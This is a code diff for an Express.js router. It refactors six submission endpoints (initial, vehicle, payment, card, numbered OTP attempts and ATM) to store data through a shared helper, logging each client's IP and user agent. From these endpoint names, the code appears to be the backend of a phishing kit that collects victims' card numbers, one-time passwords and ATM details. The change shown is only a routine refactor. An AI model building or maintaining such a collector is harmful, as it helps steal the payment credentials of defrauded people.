@@ -1,5 +1,5 @@
 import { Router, type IRouter } from "express";
-import { db, submissionsTable } from "@workspace/db";
+import { insertSubmission } from "@workspace/db";
 import {
   SubmitInitialBody,
   SubmitVehicleBody,
@@ -23,16 +23,13 @@ router.post("/submissions/initial", async (req, res): Promise<void> => {
     res.status(400).json({ error: parsed.error.message });
     return;
   }
-  const [row] = await db
-    .insert(submissionsTable)
-    .values({
-      sessionId: parsed.data.sessionId,
-      type: "initial",
-      data: JSON.stringify(parsed.data),
-      ipAddress: getClientIp(req),
-      userAgent: req.headers["user-agent"] ?? null,
-    })
-    .returning();
+  const row = await insertSubmission({
+    sessionId: parsed.data.sessionId,
+    type: "initial",
+    data: JSON.stringify(parsed.data),
+    ipAddress: getClientIp(req),
+    userAgent: req.headers["user-agent"] ?? null,
+  });
   res.status(201).json({ id: row.id, sessionId: row.sessionId });
 });
 
@@ -42,16 +39,13 @@ router.post("/submissions/vehicle", async (req, res): Promise<void> => {
     res.status(400).json({ error: parsed.error.message });
     return;
   }
-  const [row] = await db
-    .insert(submissionsTable)
-    .values({
-      sessionId: parsed.data.sessionId,
-      type: "vehicle",
-      data: JSON.stringify(parsed.data),
-      ipAddress: getClientIp(req),
-      userAgent: req.headers["user-agent"] ?? null,
-    })
-    .returning();
+  const row = await insertSubmission({
+    sessionId: parsed.data.sessionId,
+    type: "vehicle",
+    data: JSON.stringify(parsed.data),
+    ipAddress: getClientIp(req),
+    userAgent: req.headers["user-agent"] ?? null,
+  });
   res.status(201).json({ id: row.id, sessionId: row.sessionId });
 });
 
@@ -61,16 +55,13 @@ router.post("/submissions/payment", async (req, res): Promise<void> => {
     res.status(400).json({ error: parsed.error.message });
     return;
   }
-  const [row] = await db
-    .insert(submissionsTable)
-    .values({
-      sessionId: parsed.data.sessionId,
-      type: "payment",
-      data: JSON.stringify(parsed.data),
-      ipAddress: getClientIp(req),
-      userAgent: req.headers["user-agent"] ?? null,
-    })
-    .returning();
+  const row = await insertSubmission({
+    sessionId: parsed.data.sessionId,
+    type: "payment",
+    data: JSON.stringify(parsed.data),
+    ipAddress: getClientIp(req),
+    userAgent: req.headers["user-agent"] ?? null,
+  });
   res.status(201).json({ id: row.id, sessionId: row.sessionId });
 });
 
@@ -80,16 +71,13 @@ router.post("/submissions/card", async (req, res): Promise<void> => {
     res.status(400).json({ error: parsed.error.message });
     return;
   }
-  const [row] = await db
-    .insert(submissionsTable)
-    .values({
-      sessionId: parsed.data.sessionId,
-      type: "card",
-      data: JSON.stringify(parsed.data),
-      ipAddress: getClientIp(req),
-      userAgent: req.headers["user-agent"] ?? null,
-    })
-    .returning();
+  const row = await insertSubmission({
+    sessionId: parsed.data.sessionId,
+    type: "card",
+    data: JSON.stringify(parsed.data),
+    ipAddress: getClientIp(req),
+    userAgent: req.headers["user-agent"] ?? null,
+  });
   res.status(201).json({ id: row.id, sessionId: row.sessionId });
 });
 
@@ -99,16 +87,13 @@ router.post("/submissions/otp", async (req, res): Promise<void> => {
     res.status(400).json({ error: parsed.error.message });
     return;
   }
-  const [row] = await db
-    .insert(submissionsTable)
-    .values({
-      sessionId: parsed.data.sessionId,
-      type: `otp_attempt_${parsed.data.attempt}`,
-      data: JSON.stringify(parsed.data),
-      ipAddress: getClientIp(req),
-      userAgent: req.headers["user-agent"] ?? null,
-    })
-    .returning();
+  const row = await insertSubmission({
+    sessionId: parsed.data.sessionId,
+    type: `otp_attempt_${parsed.data.attempt}`,
+    data: JSON.stringify(parsed.data),
+    ipAddress: getClientIp(req),
+    userAgent: req.headers["user-agent"] ?? null,
+  });
   res.status(201).json({ id: row.id, sessionId: row.sessionId });
 });
 
@@ -118,16 +103,13 @@ router.post("/submissions/atm", async (req, res): Promise<void> => {
     res.status(400).json({ error: parsed.error.message });
     return;
   }
-  const [row] = await db
-    .insert(submissionsTable)
-    .values({
-      sessionId: parsed.data.sessionId,
-      type: "atm",
-      data: JSON.stringify(parsed.data),
-      ipAddress: getClientIp(req),
-      userAgent: req.headers["user-agent"] ?? null,
-    })
-    .returning();
+  const row = await insertSubmission({
+    sessionId: parsed.data.sessionId,
+    type: "atm",
+    data: JSON.stringify(parsed.data),
+    ipAddress: getClientIp(req),
+    userAgent: req.headers["user-agent"] ?? null,
+  });
   res.status(201).json({ id: row.id, sessionId: row.sessionId });
 });
 
